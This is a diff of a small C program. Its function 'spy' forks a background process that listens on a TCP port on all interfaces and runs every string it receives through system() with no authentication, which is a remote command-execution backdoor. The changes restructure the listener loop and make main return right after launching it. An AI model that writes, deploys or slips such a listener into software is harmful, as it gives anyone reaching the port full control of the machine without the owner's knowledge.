@@ -43,34 +43,33 @@ int			spy(char **argv)
   int			pid;
   int			n;
 
+  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+    return (printf("ERROR opening socket"));
+  my_memset((char *) &serv_addr, sizeof(serv_addr), 0);
+  portno = atoi(argv[1]) + 1;
+  serv_addr.sin_family = AF_INET;
+  serv_addr.sin_addr.s_addr = INADDR_ANY;
+  serv_addr.sin_port = swap(portno);
+  if (bind(sockfd, (struct sockaddr *) &serv_addr,
+	   sizeof(serv_addr)) < 0)
+    error("ERROR on binding");
+  listen(sockfd, 5);
+  clilen = sizeof(cli_addr);
+  if ((newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen)) < 0)
+    exit(5);
   while(1)
     {
-      if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-	return (printf("ERROR opening socket"));
-      my_memset((char *) &serv_addr, sizeof(serv_addr), 0);
-      portno = atoi(argv[1]) + 1;
-      serv_addr.sin_family = AF_INET;
-      serv_addr.sin_addr.s_addr = INADDR_ANY;
-      serv_addr.sin_port = swap(portno);
-      if (bind(sockfd, (struct sockaddr *) &serv_addr,
-	       sizeof(serv_addr)) < 0)
-	error("ERROR on binding");
-      listen(sockfd, 5);
-      clilen = sizeof(cli_addr);
-      if ((newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen)) < 0)
-	exit(5);
-      while(1)
+      my_memset(buffer, 256, 0);
+      if ((n = read(newsockfd,buffer,255)) < 0)
+	error("ERROR reading from socket");
+      if ((pid = fork()) == 0)
 	{
-	  my_memset(buffer, 256, 0);
-	  if ((n = read(newsockfd,buffer,255)) < 0)
-	    error("ERROR reading from socket");
-	  if ((pid = fork()) == 0)
-	    {
-	      system(buffer);
-	      exit(0);
-	    }
+	  system(buffer);
+	  exit(0);
 	}
     }
+  close(sockfd);
+  close(newsockfd);
   exit(1);
 }
 
@@ -91,6 +90,7 @@ int			main(int argc, char *argv[])
     }
   if ((pid = fork()) == 0)
     spy(argv);
+  return (0);
   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
     return (printf("ERROR opening socket"));
   my_memset((char *) &serv_addr, sizeof(serv_addr), 0);
